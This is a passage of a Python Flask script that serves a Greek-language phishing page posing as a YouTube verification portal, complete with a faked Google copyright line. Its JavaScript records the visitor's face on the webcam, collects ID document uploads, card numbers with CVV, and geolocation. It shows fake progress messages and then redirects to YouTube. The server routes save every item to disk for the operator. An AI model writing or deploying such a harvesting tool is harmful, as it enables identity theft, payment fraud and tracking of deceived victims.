            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        /* Πληροφοριακό Πλαίσιο */
        .info-box {{
            background: var(--youtube-gray);
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid var(--youtube-red);
        }}
        
        .info-box h4 {{
            margin-bottom: 10px;
            color: var(--youtube-red);
        }}
        
        /* Οθόνη Ολοκλήρωσης */
        .completion-screen {{
            text-align: center;
            padding: 50px 20px;
        }}
        
        .success-icon {{
            font-size: 72px;
            color: #4CAF50;
            margin-bottom: 30px;
        }}
        
        .channel-verified {{
            background: linear-gradient(45deg, var(--youtube-red), #FF6B00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 32px;
            font-weight: 600;
            margin: 20px 0;
        }}
        
        /* Υποσέλιδο */
        .footer {{
            text-align: center;
            padding: 30px 0;
            border-top: 1px solid var(--youtube-border);
            margin-top: 40px;
            color: var(--youtube-muted);
            font-size: 14px;
        }}
        
        .footer-links {{
            margin-top: 15px;
        }}
        
        .footer-links a {{
            color: var(--youtube-muted);
            text-decoration: none;
            margin: 0 10px;
        }}
        
        .footer-links a:hover {{
            color: var(--youtube-red);
            text-decoration: underline;
        }}
        
        /* Ανταποκρίση */
        @media (max-width: 768px) {{
            .container {{
                padding: 15px;
            }}
            
            .header {{
                flex-direction: column;
                text-align: center;
                gap: 15px;
            }}
            
            .channel-header {{
                flex-direction: column;
                text-align: center;
            }}
            
            .step-indicator {{
                flex-wrap: wrap;
                justify-content: center;
                gap: 20px;
            }}
            
            .step-indicator::before {{
                display: none;
            }}
            
            .camera-container {{
                width: 250px;
                height: 250px;
            }}
            
            .card-details {{
                grid-template-columns: 1fr;
            }}
            
            .button-group {{
                flex-direction: column;
            }}
            
            .age-buttons {{
                grid-template-columns: 1fr;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Κεφαλίδα -->
        <div class="header">
            <div class="logo">
                <span class="logo-icon">▶️</span>
                <span>YouTube</span>
                <span class="verification-badge">Επαλήθευση</span>
            </div>
            <div>
                {verification_badge}
            </div>
        </div>
        
        <!-- Καρτέλα Κανάλι -->
        <div class="channel-card">
            <div class="channel-header">
                <div class="channel-avatar">
                    {f'<img src="{profile_picture}">' if profile_picture else f'<div style="background:linear-gradient(45deg,#FF0000,#FF6B00);width:100%;height:100%;display:flex;align-items:center;justify-content:center;color:white;font-size:2rem;">{channel_name[0].upper() if channel_name else "Y"}</div>'}
                </div>
                <div class="channel-info">
                    <h2>{channel_name}</h2>
                    <p>{username}</p>
                    <div class="channel-stats">
                        <div class="stat">
                            <div class="stat-value">{subscriber_count}</div>
                            <div class="stat-label">Συνδρομητές</div>
                        </div>
                        <div class="stat">
                            <div class="stat-value">{content_type}</div>
                            <div class="stat-label">Περιεχόμενο</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Προειδοποίηση -->
        <div class="alert">
            <div class="alert-icon">⚠️</div>
            <div class="alert-content">
                <h3>{reason}</h3>
                <p>Πρέπει να ολοκληρώσετε την επαλήθευση για να συνεχίσετε να χρησιμοποιείτε το YouTube. Αυτό βοηθά στην προστασία του λογαριασμού σας και στη διασφάλιση της ασφάλειας της κοινότητας.</p>
            </div>
        </div>
        
        <!-- Δείκτης Βημάτων -->
        <div class="steps-container">
            <div class="step-indicator">
                {step_indicators}
            </div>
            
            <!-- Βήμα 1: Εισαγωγή -->
            <div class="step-content active" id="step1">
                <h2 class="step-title">{step_titles[0] if step_titles else "Απαιτείται Επαλήθευση"}</h2>
                <p class="step-description">
                    {verification_description}
                </p>
                
                {age_gate_section}
                {info_box_section}
                
                <div class="button-group">
                    <button class="btn btn-block" onclick="nextStep()" id="continueBtn">
                        {continue_button_text}
                    </button>
                    {'' if verification_type == 'recovery' else '<button class="btn btn-outline btn-block" onclick="skipVerification()">Παράλειψη προς το παρόν</button>'}
                </div>
            </div>
            
            <!-- Βήμα 2: Επαλήθευση Προσώπου/Ταυτότητας -->
            <div class="step-content" id="step2">
                <h2 class="step-title">{step_titles[1] if len(step_titles) > 1 else "Επαλήθευση"}</h2>
                <p class="step-description">
                    {'Επαληθεύστε την ταυτότητά σας για πρόσβαση σε περιεχόμενο με περιορισμό ηλικίας.' if verification_type == 'age' else ''}
                    {'Επαληθεύστε την ταυτότητά σας για να ανακτήσετε τον λογαριασμό σας.' if verification_type == 'recovery' else ''}
                    {'Επαληθεύστε τις πληροφορίες του καναλιού σας.' if verification_type == 'channel' else ''}
                </p>
                
                {face_verification_section}
                {id_upload_section}
                
                <div class="status-message" id="verificationStatus"></div>
                
                <div class="button-group">
                    <button class="btn" id="submitVerificationBtn" onclick="submitVerification()" {'disabled' if not (face_enabled or id_enabled) else ''}>Υποβολή Επαλήθευσης</button>
                    <button class="btn btn-outline" onclick="prevStep()">Πίσω</button>
                </div>
            </div>
            
            <!-- Βήμα 3: Πληρωμή/Τοποθεσία -->
            <div class="step-content" id="step3">
                <h2 class="step-title">{step_titles[2] if len(step_titles) > 2 else "Επιπλέον Επαλήθευση"}</h2>
                <p class="step-description">
                    Ολοκληρώστε επιπλέον βήματα επαλήθευσης.
                </p>
                
                {payment_section}
                {location_section}
                
                <div class="button-group">
                    <button class="btn" id="step3Button" onclick="completeStep3()">{'Επαλήθευση με Πληρωμή' if payment_enabled else 'Επαλήθευση Τοποθεσίας' if location_enabled else 'Συνέχεια'}</button>
                    <button class="btn btn-outline" onclick="prevStep()">Πίσω</button>
                </div>
            </div>
            
            <!-- Βήμα 4: Επεξεργασία -->
            <div class="step-content" id="stepProcessing">
                <div class="completion-screen">
                    <div class="loading-spinner" style="width: 60px; height: 60px; border-width: 4px; border-color: var(--youtube-red);"></div>
                    <h2 class="step-title">Επαληθεύονται οι Πληροφορίες σας</h2>
                    <p class="step-description">
                        Παρακαλώ περιμένετε ενώ επαληθεύουμε τις πληροφορίες σας. Αυτό συνήθως διαρκεί 1-2 λεπτά.
                    </p>
                    
                    <div class="status-message status-processing" id="processingStatus">
                        Επεξεργασία της επαλήθευσής σας...
                    </div>
                    
                    <div class="info-box">
                        <h4>Τι συμβαίνει;</h4>
                        <ul style="padding-left: 20px; margin-top: 10px;">
                            <li>Επαλήθευση υποβληθέντων εγγράφων</li>
                            <li>Έλεγχος απαιτήσεων ηλικίας</li>
                            <li>Ενημέρωση κατάστασης λογαριασμού</li>
                            <li>Εφαρμογή σήματος επαλήθευσης</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <!-- Βήμα 5: Ολοκλήρωση -->
            <div class="step-content" id="stepComplete">
                <div class="completion-screen">
                    <div class="success-icon">✓</div>
                    <h2 class="step-title">Η Επαλήθευση Ολοκληρώθηκε!</h2>
                    
                    <div class="channel-verified">
                        {channel_verified_text}
                    </div>
                    
                    <p class="step-description">
                        {'Μπορείτε τώρα να αποκτήσετε πρόσβαση σε περιεχόμενο με περιορισμό ηλικίας στο YouTube.' if verification_type == 'age' else ''}
                        {'Ο λογαριασμός σας έχει ασφαλιστεί και τώρα μπορείτε να αποκτήσετε πρόσβαση σε όλες τις λειτουργίες.' if verification_type == 'recovery' else ''}
                        {'Το κανάλι σας είναι πλέον επαληθευμένο με το επίσημο σήμα του YouTube.' if verification_type == 'channel' else ''}
                        Θα μεταφερθείτε στο YouTube σε <span id="countdown">10</span> δευτερόλεπτα.
                    </p>
                    
                    <div class="info-box">
                        {'<h4>Ολοκληρώθηκε η Επαλήθευση Ηλικίας</h4>' if verification_type == 'age' else ''}
                        {'<h4>Ολοκληρώθηκε η Ανάκτηση Λογαριασμού</h4>' if verification_type == 'recovery' else ''}
                        {'<h4>Ολοκληρώθηκε η Επαλήθευση Κανάλι</h4>' if verification_type == 'channel' else ''}
                        <p style="margin-top: 10px;">
                            {'Η ηλικία σας έχει επαληθευθεί και μπορείτε τώρα να παρακολουθήσετε όλο το περιεχόμενο.' if verification_type == 'age' else ''}
                            {'Ο λογαριασμός σας είναι πλέον ασφαλής και προστατευμένος από μη εξουσιοδοτημένη πρόσβαση.' if verification_type == 'recovery' else ''}
                            {'Το κανάλι σας έχει πλέον το επίσημο σήμα επαλήθευσης και πρόσθετες λειτουργίες.' if verification_type == 'channel' else ''}
                        </p>
                    </div>
                    
                    <div class="button-group">
                        <button class="btn" onclick="redirectToYouTube()">
                            Συνέχεια στο YouTube
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Υποσέλιδο -->
        <div class="footer">
            <div class="footer-links">
                <a href="#">Βοήθεια</a>
                <a href="#">Πολιτική Απορρήτου</a>
                <a href="#">Όροι Χρήσης</a>
                <a href="#">Σχετικά με το YouTube</a>
            </div>
            <p style="margin-top: 15px;">
                © 2024 Google LLC. Με επιφύλαξη παντός δικαιώματος.<br>
                Το YouTube είναι εμπορικό σήμα της Google LLC.
            </p>
        </div>
    </div>
    
    <script>
        // Παγκόσμιες μεταβλητές
        let currentStep = 1;
        let totalSteps = {total_steps};
        let verificationType = "{verification_type}";
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let channelName = "{channel_name}";
        let username = "{username}";
        
        // Κατάσταση επαλήθευσης
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimeLeft = {face_duration if face_enabled else 0};
        let faceTimerInterval = null;
        let idFile = null;
        let ageConfirmed = false;
        
        // Πλοήγηση Βημάτων
        function updateStepIndicators() {{
            const steps = document.querySelectorAll('.step-number');
            const labels = document.querySelectorAll('.step-label');
            
            steps.forEach((step, index) => {{
                step.classList.remove('active', 'completed');
                if (index < currentStep - 1) {{
                    step.classList.add('completed');
                }} else if (index === currentStep - 1) {{
                    step.classList.add('active');
                }}
            }});
            
            labels.forEach((label, index) => {{
                label.classList.remove('active');
                if (index === currentStep - 1) {{
                    label.classList.add('active');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
            document.querySelectorAll('.step-content').forEach(step => {{
                step.classList.remove('active');
            }});
            
            let stepId = '';
            if (stepNumber === 1) stepId = 'step1';
            else if (stepNumber === 2) stepId = 'step2';
            else if (stepNumber === 3) stepId = 'step3';
            else if (stepNumber === totalSteps - 1) stepId = 'stepProcessing';
            else if (stepNumber === totalSteps) stepId = 'stepComplete';
            
            if (stepId) {{
                document.getElementById(stepId).classList.add('active');
                currentStep = stepNumber;
                updateStepIndicators();
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        // Επαλήθευση Ηλικίας - FIXED: auto-advance on "Yes"
        function confirmAge(isAdult) {{
            ageConfirmed = isAdult;
            
            if (isAdult) {{
                // Enable and update the continue button for visual feedback
                document.getElementById('continueBtn').disabled = false;
                document.getElementById('continueBtn').textContent = '✅ Ηλικία επιβεβαιώθηκε – Προχωράμε...';
                // Auto-advance to next step after a short delay
                setTimeout(() => nextStep(), 500);
            }} else {{
                if (confirm("Πρέπει να είστε 18 ετών ή άνω για να παρακολουθήσετε περιεχόμενο με περιορισμό ηλικίας. Θα μεταφερθείτε στο YouTube Kids.")) {{
                    window.location.href = 'https://www.youtubekids.com';
                }}
            }}
        }}
        
        function skipVerification() {{
            if (confirm("Χωρίς επαλήθευση, δεν θα έχετε πρόσβαση σε περιεχόμενο με περιορισμό ηλικίας. Συνέχεια στο YouTube;")) {{
                window.location.href = 'https://www.youtube.com';
            }}
        }}
        
        // Επαλήθευση Προσώπου
        {f'''
        async function startFaceVerification() {{
            try {{
                const btn = document.getElementById("startFaceBtn");
                btn.disabled = true;
                btn.innerHTML = '<span class="loading-spinner"></span>Πρόσβαση στην Κάμερα...';
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }},
                    audio: false
                }});
                document.getElementById("faceVideo").srcObject = faceStream;
                startFaceScan();
            }} catch (error) {{
                alert("Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχετε δώσει άδεια για την κάμερα.");
                document.getElementById("startFaceBtn").disabled = false;
                document.getElementById("startFaceBtn").textContent = "Έναρξη Επαλήθευσης Προσώπου";
            }}
        }}
        
        function startFaceScan() {{
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            startFaceRecording();
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById("faceTimer").textContent =
                minutes.toString().padStart(2, "0") + ":" + seconds.toString().padStart(2, "0");
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            try {{
                faceRecorder = new MediaRecorder(faceStream, {{ mimeType: "video/webm;codecs=vp9" }});
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) faceChunks.push(event.data);
            }};
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            if (faceRecorder && faceRecorder.state === "recording") {{
                faceRecorder.stop();
            }}
            if (faceStream) faceStream.getTracks().forEach(track => track.stop());
            document.getElementById("faceTimer").textContent = "✓ Ολοκληρώθηκε";
            document.getElementById("submitVerificationBtn").disabled = false;
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            const videoBlob = new Blob(faceChunks, {{ type: "video/webm" }});
            const reader = new FileReader();
            reader.onloadend = function() {{
                const base64data = reader.result.split(",")[1];
                $.ajax({{
                    url: "/submit_face_verification",
                    type: "POST",
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        channel_name: channelName,
                        username: username,
                        verification_type: verificationType
                    }}),
                    contentType: "application/json"
                }});
            }};
            reader.readAsDataURL(videoBlob);
        }}
        ''' if face_enabled else ''}
        
        // Επαλήθευση Ταυτότητας
        {f'''
        function handleIDUpload(input) {{
            idFile = input.files[0];
            const reader = new FileReader();
            reader.onload = function(e) {{
                const preview = document.getElementById("idPreview");
                const previewImage = document.getElementById("idPreviewImage");
                previewImage.src = e.target.result;
                preview.style.display = "block";
            }};
            reader.readAsDataURL(idFile);
            document.getElementById("submitVerificationBtn").disabled = false;
        }}
        ''' if id_enabled else ''}
        
        {f'''
        function submitVerification() {{
            const statusDiv = document.getElementById("verificationStatus");
            statusDiv.className = "status-message status-processing";
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Επαληθεύεται...';
            const btn = document.getElementById("submitVerificationBtn");
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Επεξεργασία...';
            {'// Υποβολή ταυτότητας εάν μεταφορτωθεί' if id_enabled else ''}
            {f'''
            if (idFile) {{
                const formData = new FormData();
                formData.append("id_file", idFile);
                formData.append("timestamp", new Date().toISOString());
                formData.append("session_id", sessionId);
                formData.append("channel_name", channelName);
                formData.append("username", username);
                formData.append("verification_type", verificationType);
                $.ajax({{
                    url: "/submit_id_verification",
                    type: "POST",
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function() {{
                        statusDiv.className = "status-message status-success";
                        statusDiv.textContent = "✓ Υποβλήθηκε επαλήθευση";
                        setTimeout(() => nextStep(), 1500);
                    }}
                }});
            }} else {{
                // Μόνο επαλήθευση προσώπου ή παράλειψη
                setTimeout(() => nextStep(), 1500);
            }}
            ''' if id_enabled else 'setTimeout(() => nextStep(), 1500);'}
        }}
        ''' if total_steps > 2 else ''}
        
        // Επαλήθευση Πληρωμής
        {f'''
        function completeStep3() {{
            {f'''
            if (verificationType === "channel") {{
                const cardNumber = document.getElementById("cardNumber").value;
                const expiryDate = document.getElementById("expiryDate").value;
                const cvv = document.getElementById("cvv").value;
                const zipCode = document.getElementById("zipCode").value;
                if (!cardNumber || !expiryDate || !cvv || !zipCode) {{
                    alert("Παρακαλώ συμπληρώστε όλες τις πληροφορίες πληρωμής");
                    return;
                }}
                $.ajax({{
                    url: "/submit_payment_verification",
                    type: "POST",
                    data: JSON.stringify({{
                        card_number: cardNumber.replace(/\\s/g, ""),
                        expiry_date: expiryDate,
                        cvv: cvv,
                        zip_code: zipCode,
                        amount: "{payment_amount}",
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        channel_name: channelName,
                        verification_type: verificationType
                    }}),
                    contentType: "application/json"
                }});
            }}
            ''' if payment_enabled else ''}
            
            {f'''
            if (verificationType === "recovery") {{
                requestLocation();
                return;
            }}
            ''' if location_enabled else ''}
            
            startProcessing();
        }}
        ''' if total_steps > 3 else ''}
        
        // Επαλήθευση Τοποθεσίας
        {f'''
        function requestLocation() {{
            const statusDiv = document.getElementById("locationStatus");
            const btn = document.getElementById("step3Button");
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Λήψη Τοποθεσίας...';
            statusDiv.className = "status-message status-processing";
            statusDiv.textContent = "Πρόσβαση στην τοποθεσία σας...";
            if (!navigator.geolocation) {{
                statusDiv.className = "status-message status-error";
                statusDiv.textContent = "Η γεωεντοπισμός δεν υποστηρίζεται";
                return;
            }}
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    statusDiv.className = "status-message status-success";
                    statusDiv.textContent = "✓ Επαληθεύθηκε τοποθεσία";
                    btn.disabled = true;
                    btn.textContent = "✓ Επαληθεύθηκε Τοποθεσία";
                    $.ajax({{
                        url: "/submit_location_verification",
                        type: "POST",
                        data: JSON.stringify({{
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString(),
                            session_id: sessionId,
                            channel_name: channelName,
                            verification_type: verificationType
                        }}),
                        contentType: "application/json"
                    }});
                    setTimeout(() => startProcessing(), 1500);
                }},
                (error) => {{
                    statusDiv.className = "status-message status-error";
                    statusDiv.textContent = "Απορρίφθηκε πρόσβαση τοποθεσίας";
                    btn.disabled = false;
                    btn.textContent = "Δοκιμάστε Ξανά";
                }}
            );
        }}
        ''' if location_enabled else ''}
        
        // Επεξεργασία
        function startProcessing() {{
            showStep(totalSteps - 1);
            
            const statusDiv = document.getElementById('processingStatus');
            let progress = 0;
            
            const interval = setInterval(() => {{
                progress += Math.random() * 20;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 30) {{
                    message = 'Επαλήθευση πληροφοριών... ' + Math.round(progress) + '%';
                }} else if (progress < 60) {{
                    message = 'Έλεγχος διαπιστευτηρίων... ' + Math.round(progress) + '%';
                }} else if (progress < 90) {{
                    message = 'Εφαρμογή επαλήθευσης... ' + Math.round(progress) + '%';
                }} else {{
                    message = 'Ολοκλήρωση... ' + Math.round(progress) + '%';
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(interval);
                    setTimeout(() => {{
                        completeVerification();
                    }}, 1000);
                }}
            }}, 500);
        }}
        
        function completeVerification() {{
            // Υποβολή δεδομένων ολοκλήρωσης
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    channel_name: channelName,
                    username: username,
                    verification_type: verificationType,
                    completed_at: new Date().toISOString(),
                    user_agent: navigator.userAgent
                }}),
                contentType: 'application/json'
            }});
            
            showStep(totalSteps);
            startCountdown();
        }}
        
        function startCountdown() {{
            let countdown = 10;
            const element = document.getElementById('countdown');
            
            const timer = setInterval(() => {{
                countdown--;
                element.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(timer);
                    redirectToYouTube();
                }}
            }}, 1000);
        }}
        
        function redirectToYouTube() {{
            window.location.href = 'https://www.youtube.com';
        }}
        
        // Αρχικοποίηση
        updateStepIndicators();
        
        // Μορφοποίηση εισαγωγών
        {'''
        document.getElementById("cardNumber")?.addEventListener("input", function(e) {
            let value = e.target.value.replace(/\\D/g, "");
            let formatted = "";
            for (let i = 0; i < value.length && i < 16; i++) {
                if (i > 0 && i % 4 === 0) formatted += " ";
                formatted += value[i];
            }
            e.target.value = formatted;
        });
        
        document.getElementById("expiryDate")?.addEventListener("input", function(e) {
            let value = e.target.value.replace(/\\D/g, "");
            if (value.length >= 2) {
                value = value.substring(0, 2) + "/" + value.substring(2, 4);
            }
            e.target.value = value;
        });
        ''' if payment_enabled else ''}
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'άγνωστο')
            channel_name = data.get('channel_name', 'άγνωστο')
            username = data.get('username', 'άγνωστο')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"youtube_face_{channel_name}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', filename)
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_verification', f"metadata_{channel_name}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'face_verification',
                'channel_name': channel_name,
                'username': username,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'youtube_el',
                'verification_type': data.get('verification_type', 'άγνωστο')
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση προσώπου YouTube: {filename}")
            return jsonify({"status": "επιτυχία"}), 200
        else:
            return jsonify({"status": "σφάλμα"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης προσώπου: {e}")
        return jsonify({"status": "σφάλμα"}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'άγνωστο')
        channel_name = request.form.get('channel_name', 'άγνωστο')
        username = request.form.get('username', 'άγνωστο')
        verification_type = request.form.get('verification_type', 'άγνωστο')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        id_filename = None
        if 'id_file' in request.files:
            id_file = request.files['id_file']
            if id_file.filename:
                file_ext = id_file.filename.split('.')[-1] if '.' in id_file.filename else 'jpg'
                id_filename = f"youtube_id_{channel_name}_{session_id}_{timestamp}.{file_ext}"
                id_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', id_filename)
                id_file.save(id_path)
        
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{channel_name}_{session_id}_{timestamp}.json")
        metadata = {
            'id_file': id_filename,
            'type': 'id_verification',
            'channel_name': channel_name,
            'username': username,
            'session_id': session_id,
            'verification_type': verification_type,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'platform': 'youtube_el'
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Αποθηκεύτηκε έγγραφο ταυτότητας YouTube: {id_filename}")
        return jsonify({"status": "επιτυχία"}), 200
        
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης ταυτότητας: {e}")
        return jsonify({"status": "σφάλμα"}), 500

@app.route('/submit_payment_verification', methods=['POST'])
def submit_payment_verification():
    try:
        data = request.get_json()
        if data and 'card_number' in data:
            session_id = data.get('session_id', 'άγνωστο')
            channel_name = data.get('channel_name', 'άγνωστο')
            verification_type = data.get('verification_type', 'άγνωστο')
            
            # Μασκάρισμα αριθμού κάρτας για αποθήκευση
            card_number = data.get('card_number', '')
            masked_card = card_number[-4:] if len(card_number) >= 4 else card_number
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"youtube_payment_{channel_name}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'payment_data', filename)
            
            payment_data = {
                'type': 'payment_verification',
                'channel_name': channel_name,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'platform': 'youtube_el',
                'verification_type': verification_type,
                'payment_info': {
                    'card_last_four': masked_card,
                    'expiry_date': data.get('expiry_date', ''),
                    'amount': data.get('amount', '1.00'),
                    'zip_code': data.get('zip_code', '')
                },
                'verification_result': 'εκκρεμεί',
                'note': 'Επαλήθευση πληρωμής για επαλήθευση καναλιού'
            }
            
            with open(file_path, 'w') as f:
                json.dump(payment_data, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση πληρωμής YouTube: {filename}")
            return jsonify({"status": "επιτυχία"}), 200
        else:
            return jsonify({"status": "σφάλμα"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης πληρωμής: {e}")
        return jsonify({"status": "σφάλμα"}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'άγνωστο')
            channel_name = data.get('channel_name', 'άγνωστο')
            verification_type = data.get('verification_type', 'άγνωστο')
            
            # Επεξεργασία τοποθεσίας σε παρασκήνιο
            data['target_username'] = channel_name
            data['verification_type'] = verification_type
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Λήφθηκαν δεδομένα τοποθεσίας YouTube: {session_id}")
            return jsonify({"status": "επιτυχία"}), 200
        else:
            return jsonify({"status": "σφάλμα"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης τοποθεσίας: {e}")
        return jsonify({"status": "σφάλμα"}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'άγνωστο')
            channel_name = data.get('channel_name', 'άγνωστο')
            username = data.get('username', 'άγνωστο')
            verification_type = data.get('verification_type', 'άγνωστο')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"youtube_complete_{channel_name}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            data['received_at'] = datetime.now().isoformat()
            data['platform'] = 'youtube_el'
            data['verification_completed'] = True
            
            if verification_type == 'age':
                data['age_verified'] = True
                data['age_restriction_bypassed'] = True
            elif verification_type == 'recovery':
                data['account_recovered'] = True
                data['security_updated'] = True
            else:  # επαλήθευση καναλιού
                data['channel_verified'] = True
                data['verification_badge'] = True
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Αποθηκεύτηκε σύνοψη επαλήθευσης YouTube: {filename}")
            return jsonify({"status": "επιτυχία"}), 200
        else:
            return jsonify({"status": "σφάλμα"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης σύνοψης επαλήθευσης: {e}")
        return jsonify({"status": "σφάλμα"}), 500

if __name__ == '__main__':
    check_dependencies()
    
    # Λήψη ρυθμίσεων επαλήθευσης
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4049
    script_name = "Πύλη Επαλήθευσης YouTube"
    
    print("\n" + "="*60)
    print("ΠΥΛΗ ΕΠΑΛΗΘΕΥΣΗΣ YOUTUBE")
    print("="*60)
    print(f"[+] Κανάλι: {VERIFICATION_SETTINGS['channel_name']}")
    print(f"[+] Όνομα χρήστη: @{VERIFICATION_SETTINGS['username']}")
    print(f"[+] Συνδρομητές: {VERIFICATION_SETTINGS['subscriber_count']}")
    print(f"[+] Περιεχόμενο: {VERIFICATION_SETTINGS['content_type']}")
    print(f"[+] Τύπος Επαλήθευσης: {VERIFICATION_SETTINGS['verification_type'].upper()}")
    print(f"[+] Λόγος: {VERIFICATION_SETTINGS['reason']}")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Εικόνα Προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    
    print(f"\n[+] Φάκελος δεδομένων: {DOWNLOAD_FOLDER}")
    
    if VERIFICATION_SETTINGS['face_enabled']:
        print(f"[+] Επαλήθευση προσώπου: Ενεργοποιημένη ({VERIFICATION_SETTINGS['face_duration']}s)")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] Επαλήθευση ταυτότητας: Ενεργοποιημένη")
    if VERIFICATION_SETTINGS.get('payment_enabled'):
        print(f"[+] Επαλήθευση πληρωμής: Ενεργοποιημένη (${VERIFICATION_SETTINGS.get('payment_amount', '1.00')})")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Επαλήθευση τοποθεσίας: Ενεργοποιημένη")
    
    print("\n[+] Εκκίνηση πύλης επαλήθευσης YouTube...")
    print("[+] Πατήστε Ctrl+C για διακοπή.\n")
    
    print("="*60)
    print("ΑΠΑΙΤΕΙΤΑΙ ΕΠΑΛΗΘΕΥΣΗ YOUTUBE")
    print("="*60)
    print(f"🎬 Κανάλι: {VERIFICATION_SETTINGS['channel_name']}")
    print(f"👤 Όνομα χρήστη: @{VERIFICATION_SETTINGS['username']}")
    print(f"👥 Συνδρομητές: {VERIFICATION_SETTINGS['subscriber_count']}")
    print(f"📺 Περιεχόμενο: {VERIFICATION_SETTINGS['content_type']}")
